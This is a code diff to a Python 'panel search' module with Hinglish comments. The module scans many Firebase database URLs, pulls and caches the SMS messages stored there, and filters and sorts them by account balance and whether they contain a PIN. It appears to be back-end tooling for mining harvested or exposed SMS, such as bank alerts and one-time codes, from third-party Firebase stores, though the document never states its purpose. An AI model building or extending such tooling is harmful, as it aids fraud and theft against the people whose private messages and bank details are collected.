@@ -170,78 +170,116 @@ def format_result_file(matches: list[SearchMatch], params: SearchParams) -> str:
     return "\n".join(lines)
 
 
+def _apply_live_refresh(
+    db: Session,
+    firebase_rows: list[FirebaseDb],
+    live: dict[str, tuple[bool, list[dict], str]],
+    url_to_row: dict[str, FirebaseDb],
+    result: SearchResult,
+) -> set[int]:
+    """Fetch se cache update + kaunse DB abhi online hain."""
+    live_online: set[int] = set()
+    for url, (online, sms_list, _resolved) in live.items():
+        row = url_to_row.get(url)
+        if not row:
+            continue
+        has_data = bool(sms_list)
+        if online and has_data:
+            result.dbs_online += 1
+        if has_data:
+            upsert_cached_sms(db, row.id, row.url_normalized, sms_list)
+        update_firebase_status(db, row.id, online or has_data)
+        if online or has_data:
+            live_online.add(row.id)
+    return live_online
+
+
+def _db_ids_for_mode(
+    db: Session,
+    firebase_rows: list[FirebaseDb],
+    *,
+    mode: str,
+    live_online: set[int],
+) -> list[int]:
+    """Online = sirf online DBs ki cache; offline = dead/offline; both = sab jahan cache hai."""
+    all_ids = [r.id for r in firebase_rows]
+    if mode == "both":
+        return list(firebase_ids_with_cache(db, all_ids))
+
+    status_rows = (
+        db.query(FirebaseDb.id, FirebaseDb.is_online).filter(FirebaseDb.id.in_(all_ids)).all()
+    )
+    online_ids: list[int] = []
+    offline_ids: list[int] = []
+    for fb_id, is_online in status_rows:
+        if is_online is True or fb_id in live_online:
+            online_ids.append(fb_id)
+        elif is_online is False:
+            offline_ids.append(fb_id)
+
+    if mode == "online":
+        if not online_ids and live_online:
+            online_ids = list(live_online)
+        return online_ids
+
+    # offline — sirf explicitly offline (unknown/null skip unless live ne online kiya)
+    return offline_ids
+
+
+def _matches_from_cache(
+    db: Session,
+    firebase_db_ids: list[int],
+    params: SearchParams,
+) -> list[SearchMatch]:
+    if not firebase_db_ids:
+        return []
+    matches: list[SearchMatch] = []
+    fb_url: dict[int, str] = {
+        r.id: r.url_normalized
+        for r in db.query(FirebaseDb).filter(FirebaseDb.id.in_(firebase_db_ids)).all()
+    }
+    for row in load_cached_sms_for_keywords(db, firebase_db_ids, params.keywords):
+        url = fb_url.get(row.firebase_db_id, "unknown")
+        if _filter_row(row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params):
+            matches.append(match_from_cache_row(url, row))
+    return matches
+
+
+def _dedupe_matches(matches: list[SearchMatch]) -> list[SearchMatch]:
+    seen: set[tuple] = set()
+    unique: list[SearchMatch] = []
+    for m in matches:
+        key = (m.firebase_url, m.device_id, m.body[:200], m.message_at)
+        if key in seen:
+            continue
+        seen.add(key)
+        unique.append(m)
+    return unique
+
+
 def _finalize_search(
     firebase_rows: list[FirebaseDb],
     params: SearchParams,
     live: dict[str, tuple[bool, list[dict], str]],
     skipped_cached: set[str],
 ) -> SearchResult:
+    del skipped_cached  # cache pass ab mode se decide hota hai
     db = SessionLocal()
     started = time.time()
-    matches: list[SearchMatch] = []
     url_to_row = {row.url_normalized: row for row in firebase_rows}
     urls = list(url_to_row.keys())
     result = SearchResult(dbs_scanned=len(urls))
 
     try:
-        if params.mode in ("online", "both") and urls:
-            for url, (online, sms_list, _resolved) in live.items():
-                row = url_to_row.get(url)
-                if not row:
-                    continue
-                has_data = bool(sms_list)
-                if online and has_data:
-                    result.dbs_online += 1
-                if has_data:
-                    upsert_cached_sms(db, row.id, row.url_normalized, sms_list)
-                # dead / empty / wrong URL → offline (next scan skip)
-                update_firebase_status(db, row.id, online or has_data)
-                for item in sms_list:
-                    if _filter_row(
-                        item.get("sender", ""),
-                        item.get("body", ""),
-                        item.get("message_at"),
-                        item.get("balance"),
-                        item.get("has_pin", False),
-                        params,
-                    ):
-                        matches.append(match_from_live_item(url, item))
+        live_online: set[int] = set()
+        if live:
+            live_online = _apply_live_refresh(db, firebase_rows, live, url_to_row, result)
 
-            if params.mode == "online" and skipped_cached:
-                skip_ids = [url_to_row[u].id for u in skipped_cached if u in url_to_row]
-                for row in load_cached_sms_for_keywords(db, skip_ids, params.keywords):
-                    fb = db.query(FirebaseDb).filter(FirebaseDb.id == row.firebase_db_id).first()
-                    url = fb.url_normalized if fb else "unknown"
-                    if _filter_row(
-                        row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params
-                    ):
-                        matches.append(match_from_cache_row(url, row))
-
-        if params.mode in ("offline", "both"):
-            ids = [row.id for row in firebase_rows]
-            if params.mode == "both":
-                cache_ids = list(firebase_ids_with_cache(db, ids))
-                cached = load_cached_sms_for_keywords(db, cache_ids, params.keywords)
-            else:
-                cached = load_cached_sms_for_keywords(db, ids, params.keywords)
-            if params.mode == "offline":
-                result.dbs_scanned = len(firebase_rows)
-            for row in cached:
-                fb = db.query(FirebaseDb).filter(FirebaseDb.id == row.firebase_db_id).first()
-                url = fb.url_normalized if fb else "unknown"
-                if _filter_row(row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params):
-                    matches.append(match_from_cache_row(url, row))
+        search_ids = _db_ids_for_mode(db, firebase_rows, mode=params.mode, live_online=live_online)
+        matches = _matches_from_cache(db, search_ids, params)
 
         if params.mode == "both":
-            seen: set[tuple] = set()
-            unique: list[SearchMatch] = []
-            for m in matches:
-                key = (m.firebase_url, m.body[:200], m.message_at)
-                if key in seen:
-                    continue
-                seen.add(key)
-                unique.append(m)
-            matches = unique
+            matches = _dedupe_matches(matches)
 
         result.matches = _sort_matches(matches, params.balance_sort)
         result.elapsed_sec = time.time() - started
@@ -308,7 +346,8 @@ async def run_search(
     # For online-only + day filter, still skip live on cache — dates are often missing in cache anyway.
     has_cache = len(cached_ids) >= settings.panel_search_min_cached_dbs_for_fast_both
 
-    if settings.panel_search_skip_live_if_cached and cached_ids:
+    # Online: hamesha live refresh taaki online/offline status + cache fresh rahe
+    if settings.panel_search_skip_live_if_cached and cached_ids and params.mode != "online":
         skipped_cached = {u for u in urls if url_to_row[u].id in cached_ids}
         fetch_urls = [u for u in fetch_urls if u not in skipped_cached]
         skipped_n = len(skipped_cached)
@@ -345,9 +384,18 @@ async def run_search(
             )
 
     # "Both" with big cache: live sirf uncached; warna poora live (VPS pe 0-match bug fix).
-    if params.mode == "both" and settings.panel_search_both_skip_uncached_live and has_cache:
+    if (
+        params.mode == "both"
+        and settings.panel_search_both_skip_uncached_live
+        and has_cache
+    ):
         fetch_urls = [u for u in urls if url_to_row[u].id not in cached_ids and u not in skipped_offline]
         skipped_n = len({u for u in urls if url_to_row[u].id in cached_ids})
+
+    if params.mode == "online":
+        fetch_urls = [u for u in urls if u not in skipped_offline]
+        skipped_cached = set()
+        skipped_n = 0
 
     if not fetch_urls and params.mode in ("online", "both"):
         uncached = [u for u in urls if url_to_row[u].id not in cached_ids]
